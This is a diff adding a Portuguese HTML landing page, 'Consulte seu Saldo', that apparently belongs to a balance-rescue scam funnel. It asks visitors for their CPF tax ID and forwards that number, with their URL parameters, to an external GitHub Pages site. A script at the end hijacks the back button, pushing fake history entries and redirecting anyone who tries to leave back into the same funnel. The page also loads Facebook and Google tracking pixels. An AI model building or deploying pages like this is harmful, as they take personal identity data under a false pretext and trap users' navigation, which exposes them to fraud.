@@ -1,0 +1,141 @@
+<!DOCTYPE html><html><head> <meta charset="utf-8"> <meta http-equiv="x-ua-compatible" content="ie=edge"> <title>Consulta - Etapa 1</title> <meta name="description" content> <meta name="viewport" content="width=device-width,initial-scale=1"> <link href="https://fonts.cdnfonts.com/css/poppins" rel="stylesheet" type="text/css"> <style type="text/css">.u-row{display:flex;flex-wrap:nowrap;margin-left:0;margin-right:0}.u-row .u-col{position:relative;width:100%;padding-right:0;padding-left:0}.u-row .u-col.u-col-100{flex:0 0 100%;max-width:100%}@media (max-width:767px){.u-row:not(.no-stack){flex-wrap:wrap}.u-row:not(.no-stack) .u-col{flex:0 0 100%!important;max-width:100%!important}}body,html{padding:0;margin:0}html{box-sizing:border-box}*,:after,:before{box-sizing:inherit}html{font-size:14px;-ms-overflow-style:scrollbar;-webkit-tap-highlight-color:transparent}p{margin:0}form .error-field{-webkit-animation-name:shake;animation-name:shake;-webkit-animation-duration:1s;animation-duration:1s;-webkit-animation-fill-mode:both;animation-fill-mode:both}form .error-field input,form .error-field textarea{border-color:#a94442!important;color:#a94442!important}form .field-error{padding:5px 10px;font-size:14px;font-weight:700;position:absolute;top:-20px;right:10px}form .field-error:after{top:100%;left:50%;border:solid transparent;content:" ";height:0;width:0;position:absolute;pointer-events:none;border-color:rgba(136,183,213,0);border-top-color:#ebcccc;border-width:5px;margin-left:-5px}form .spinner{margin:0 auto;width:70px;text-align:center}form .spinner>div{width:12px;height:12px;background-color:hsla(0,0%,100%,.5);margin:0 2px;border-radius:100%;display:inline-block;-webkit-animation:sk-bouncedelay 1.4s infinite ease-in-out both;animation:sk-bouncedelay 1.4s infinite ease-in-out both}form .spinner .bounce1{-webkit-animation-delay:-.32s;animation-delay:-.32s}form .spinner .bounce2{-webkit-animation-delay:-.16s;animation-delay:-.16s}@-webkit-keyframes sk-bouncedelay{0%,80%,to{-webkit-transform:scale(0)}40%{-webkit-transform:scale(1)}}@keyframes sk-bouncedelay{0%,80%,to{-webkit-transform:scale(0);transform:scale(0)}40%{-webkit-transform:scale(1);transform:scale(1)}}@-webkit-keyframes shake{0%,to{-webkit-transform:translateZ(0);transform:translateZ(0)}10%,30%,50%,70%,90%{-webkit-transform:translate3d(-10px,0,0);transform:translate3d(-10px,0,0)}20%,40%,60%,80%{-webkit-transform:translate3d(10px,0,0);transform:translate3d(10px,0,0)}}@keyframes shake{0%,to{-webkit-transform:translateZ(0);transform:translateZ(0)}10%,30%,50%,70%,90%{-webkit-transform:translate3d(-10px,0,0);transform:translate3d(-10px,0,0)}20%,40%,60%,80%{-webkit-transform:translate3d(10px,0,0);transform:translate3d(10px,0,0)}}@media (max-width:480px){.container{max-width:100%!important}}@media (min-width:481px) and (max-width:768px){.hide-tablet{display:none!important}}.container{width:100%;padding-right:0;padding-left:0;margin-right:auto;margin-left:auto}@media (min-width:576px){.container{max-width:540px}}@media (min-width:768px){.container{max-width:720px}}@media (min-width:992px){.container{max-width:960px}}@media (min-width:1200px){.container{max-width:1140px}}a[onclick]{cursor:pointer}body{font-family:Poppins,sans-serif;font-size:1rem;line-height:1.5;color:#000;background-color:#010;background-image:url(images/123tapronto1689815635799-Design%2Bsem%2Bnome%2B%282%29.png);background-repeat:no-repeat;background-position:center center}#u_body a{color:#00e;text-decoration:underline}#u_body a:hover{color:#00e;text-decoration:underline}#botaoSend a:hover{color:#000!important;background-color:#e67e23!important}@media (max-width:480px){#u_content_image_1 .v-src-width{width:auto!important}#u_content_image_1 .v-src-max-width{max-width:78%!important}#u_content_image_5.v-container-padding-padding{padding:10px 10px 20px!important}}</style> 
+                <style>
+                    html {
+                        scroll-behavior: smooth;
+                    }
+                </style>
+
+                
+            <script async src="js/gtm.js"></script><script>
+                const v_123_pageId = "64b88d67934256f623ec240c";
+                const v_123_siteId = "64b88d68934256f623ec241a";
+                const v_123_siteType = "HTML";
+                const v_123_slug = null;
+            </script>
+
+            
+                    <script>
+                        const v_123_delayActive = false;
+                    </script>
+
+                    <script>
+    window.onload = function () {
+        var links = document.getElementsByTagName("a");
+        for (var i = 0, n = links.length; i < n; i++) {
+            var href = links[i].href.trim() +
+                    (links[i].href.indexOf("?") > 0 ? '&' : '?') +
+                    document.location.search.replace('?', '').toString();
+            links[i].href = href;
+        }
+    }
+</script>
+
+
+<script src="js/jquery.min.js"></script>
+<script>
+	const queryString = window.location.search;
+	const urlParams = new URLSearchParams(queryString);
+	const utmcontent = urlParams.get('utm_content');
+	(function ($) {
+		$('a').each(function () {
+			let href = $(this).attr("href");
+			if (href === undefined || href.indexOf("#") >= 0 || href.indexOf("api.whatsapp") >= 0) return true;
+			if (href.indexOf("perfectpay") > 0 ){
+				$(this).addClass('markGTAG');
+			}
+			let search_params = document.location.search.replace('?', '');
+			let urlFinal = href + (href.indexOf("?") > 0 ? '&' : '?') + search_params.toString();
+			const srcCheck = new URL(urlFinal);
+			let src = srcCheck.searchParams.set('src',srcCheck.searchParams.get('src')+'_UTMCONTENT_'+utmcontent);
+			$(this).attr("href", srcCheck.href);
+
+		});
+	})(jQuery);
+</script><script async src="https://www.googletagmanager.com/gtag/js?id=AW-GTM-TLXTNTV"></script>
+                    <script>
+                      window.dataLayer = window.dataLayer || [];
+                      function gtag(){dataLayer.push(arguments);}
+                      gtag('js', new Date());
+                      gtag('config', 'AW-GTM-TLXTNTV');
+                    </script></head> <body> <div id="u_body" class="u_body" style="min-height:100vh"> <div id="u_row_1" class="u_row" style="padding:0"> <div class="container" style="max-width:800px;margin:0 auto"> <div class="u-row"> <div id="u_column_1" class="u-col u-col-100 u_column" style="display:flex;border-top:0 solid transparent;border-left:0 solid transparent;border-right:0 solid transparent;border-bottom:0 solid transparent"> <div style="width:100%;padding:0"> <div id="u_content_image_1" class="u_content_image v-container-padding-padding" style="overflow-wrap:break-word;padding:10px 10px 0"> <div style="position:relative;line-height:0;text-align:center"> <img alt class="v-src-width v-src-max-width" src="images/123tapronto1689814999665-Design-sem-nome-4-q6nli1mljhf7c6epw9e82ymbgyg6w60itqm7m3u7yc.png" style="width:47%;max-width:47%" title> </div> </div> <div id="u_content_image_2" class="u_content_image v-container-padding-padding" style="overflow-wrap:break-word;padding:0 10px"> <div style="position:relative;line-height:0;text-align:center"> <img alt class="v-src-width v-src-max-width" src="images/123tapronto1689815061677-1.png" style="width:100%;max-width:642px" title> </div> </div> <div id="u_content_image_3" class="u_content_image v-container-padding-padding" style="overflow-wrap:break-word;padding:0 10px"> <div style="position:relative;line-height:0;text-align:center"> <img alt class="v-src-width v-src-max-width" src="images/123tapronto1689815064216-2.png" style="width:100%;max-width:643px" title> </div> </div> <div id="u_content_image_4" class="u_content_image v-container-padding-padding" style="overflow-wrap:break-word;padding:0 10px"> <div style="position:relative;line-height:0;text-align:center"> <img alt class="v-src-width v-src-max-width" src="images/123tapronto1689815067617-3.png" style="width:100%;max-width:661px" title> </div> </div> <div id="u_content_html_2" class="u_content_html v-container-padding-padding" style="overflow-wrap:break-word;padding:10px"> <div><style>body{background-color:#333;color:#fff;font-size:18px}form{max-width:300px;margin:0 auto;font-size:20px}label{display:block;margin-bottom:8px}input[type=date],input[type=text]{width:100%;padding:8px;margin-bottom:16px;border:1px solid #ccc;border-radius:4px;font-size:16px}input[type=date]:focus,input[type=text]:focus{outline:0;border-color:#4caf50}h1{text-align:center;font-size:24px}</style> <h1>Consulte seu Saldo</h1> <form method="GET" action="https://zebaum.github.io/resgatandobrasil.online/Evv/2/" id="cpfForm"> <label for="cpf">CPF:</label> <input type="text" id="cpf" name="cpf" minlength="14" maxlength="14" oninput="handleCPFInput(event)" pattern="[0-9()#&+*-=.]+" placeholder="Exemplo: 000.000.000-00" required><br> </form> <div id="cpf-error-msg"></div> <script> function isValidCPF(cpf) {
+  if (typeof cpf !== "string") return false;
+  cpf = cpf.replace(/\D/g, "");
+  if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+
+  let sum = 0;
+  let remainder;
+  for (let i = 1; i <= 9; i++) {
+    sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
+  }
+  remainder = (sum * 10) % 11;
+
+  if (remainder === 10 || remainder === 11) remainder = 0;
+  if (remainder !== parseInt(cpf.substring(9, 10))) return false;
+
+  sum = 0;
+  for (let i = 1; i <= 10; i++) {
+    sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
+  }
+  remainder = (sum * 10) % 11;
+
+  if (remainder === 10 || remainder === 11) remainder = 0;
+  if (remainder !== parseInt(cpf.substring(10, 11))) return false;
+
+  return true;
+}
+
+function handleCPFInput(event) {
+  const cpf = event.target.value.replace(/\D/g, '');
+
+  if (cpf.length >= 4) {
+    event.target.value = cpf.slice(0, 3) + '.' + cpf.slice(3);
+  }
+
+  if (cpf.length >= 7) {
+    event.target.value = cpf.slice(0, 3) + '.' + cpf.slice(3, 6) + '.' + cpf.slice(6);
+  }
+
+  if (cpf.length >= 10) {
+    event.target.value = cpf.slice(0, 3) + '.' + cpf.slice(3, 6) + '.' + cpf.slice(6, 9) + '-' + cpf.slice(9);
+  }
+
+  const errorMsg = document.getElementById('cpf-error-msg');
+  if (cpf.length === 11) {
+    if (isValidCPF(cpf)) {
+      errorMsg.textContent = '';
+      document.querySelector('#botaoSend').style.display = 'block';
+    } else {
+      errorMsg.textContent = 'Digite um CPF válido';
+      document.querySelector('#botaoSend').style.display = 'none';
+    }
+  } else {
+    errorMsg.textContent = '';
+  }
+}
+
+window.onload=function(){
+    let botaoSend = document.getElementById("botaoSend");
+    botaoSend.onclick = function () {
+      var urlParams = new URLSearchParams(window.location.search);
+      window.location.href = 'https://zebaum.github.io/resgatandobrasil.online/Evv/2/?'+ urlParams.toString()+'&cpf='+document.querySelector('#cpf').value;
+    };
+} </script></div> </div> <div id="botaoSend" class="u_content_button v-container-padding-padding" style="overflow-wrap:break-word;padding:10px"> <div style="text-align:center"> <a href="javascript:;" target="_self" style="color:#0e0d0d;background-color:#db690b;border-radius:4px;line-height:120%;display:inline-block;text-decoration:none;text-align:center;padding:10px 20px;width:auto;max-width:100%;word-wrap:break-word;font-size:21px"> <strong>🔎 CONSULTAR AGORA</strong> </a> </div> </div> <div id="u_content_image_5" class="u_content_image v-container-padding-padding" style="overflow-wrap:break-word;padding:10px"> <div style="position:relative;line-height:0;text-align:center"> <img alt class="v-src-width v-src-max-width" src="images/123tapronto1690939886092-772792.jpg" style="width:100%;max-width:101px" title> </div> </div> <div id="u_content_menu_2" class="u_content_menu v-container-padding-padding" style="overflow-wrap:break-word;padding:10px"> <div style="text-align:center"><a href="https://resgateosaldo.online/termos-de-uso/" target="_self" style="display:block;padding:5px 15px;font-size:16px;color:#fff;text-decoration:none">Termos de Uso</a><a href="https://resgateosaldo.online/politicas-de-privacidade/" target="_self" style="display:block;padding:5px 15px;font-size:16px;color:#fff;text-decoration:none">Política de Privacidade</a></div> </div> </div> </div> </div> </div> </div> </div>  
+
+                    <script async="true" src="js/123global.js"></script>
+                
+            <script type="text/javascript">
+                var back_redirect_back_link = 'https://zebaum.github.io/resgatandobrasil.online/Evv/2/';
+                history.pushState({}, "", location.href);
+                history.pushState({}, "", location.href);
+                window.onpopstate = function () {
+                    setTimeout(function () {
+                    location.href = back_redirect_back_link + location.search;
+                    }, 1);
+                };
+            </script>
+            <noscript>
+  <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=188706664206426&amp;ev=PageView&amp;noscript=1">
+</noscript>
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TLXTNTV" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) --></body></html>
